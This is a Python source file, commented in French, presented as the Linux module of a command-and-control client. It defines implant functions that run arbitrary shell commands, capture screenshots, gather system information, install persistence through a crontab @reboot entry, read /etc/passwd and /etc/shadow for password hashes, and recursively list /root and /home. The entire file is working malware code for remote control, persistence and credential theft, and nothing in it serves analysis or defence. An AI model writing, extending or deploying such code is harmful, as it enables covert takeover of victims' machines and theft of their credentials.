# Module Linux pour le client C2

import subprocess
import platform
import socket
import os
import sys
import mss, mss.tools

def run_shell(command):
    if command.strip().startswith("apt"):
        command = f"DEBIAN_FRONTEND=noninteractive {command}" #pour un apt install par ex ca demande une confirmation donc on force sans confirm
    result = subprocess.run(
        command, shell=True,
        capture_output=True, text=True, timeout=120
    )
    return {
        "status": "ok",
        "output": result.stdout + result.stderr,
        "returncode": result.returncode
    }


def take_screenshot():
    with mss.mss() as sct:
        shot = sct.grab(sct.monitors[0])
        return mss.tools.to_png(shot.rgb, shot.size)


def get_sysinfo():
    return {
        "os": platform.system(),
        "version": platform.version(),
        "hostname": platform.node(),
        "username": os.getenv("USER", "?"),
        "processor": platform.processor()
    }


def get_real_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def install_persistence():
    exe = sys.executable
    args = " ".join(sys.argv)
    cron_line = f"@reboot {exe} {args}"
    result = subprocess.run(
        f'(crontab -l 2>/dev/null | grep -v "c2_client"; echo "{cron_line}") | crontab -',
        shell=True, capture_output=True, text=True
    )
    if result.returncode == 0:
        return {"status": "ok", "message": "Persistence installée via crontab @reboot"}
    return {"status": "error", "message": result.stderr}


def get_passwd_shadow():
    output = ""

    # on lit /etc/passwd (liste des utilisateurs)
    try:
        with open("/etc/passwd", "r") as f:
            output += "=== /etc/passwd ===\n"
            output += f.read()
            output += "\n"
    except PermissionError:
        output += "=== /etc/passwd === Accès refusé\n"

    # on lit /etc/shadow (hash des mots de passe, faut etre root)
    try:
        with open("/etc/shadow", "r") as f:
            output += "=== /etc/shadow ===\n"
            output += f.read()
    except PermissionError:
        output += "=== /etc/shadow === Accès refusé — root requis\n"

    return {"status": "ok", "output": output, "returncode": 0}


def list_sensitive_dirs():
    # on liste /root et /home de facon recursive
    result = subprocess.run(
        "echo '=== /root ===' && ls -laR /root 2>/dev/null && echo '=== /home ===' && ls -laR /home 2>/dev/null",
        shell=True, capture_output=True, text=True
    )
    return {
        "status": "ok",
        "output": result.stdout + result.stderr,
        "returncode": result.returncode
    }
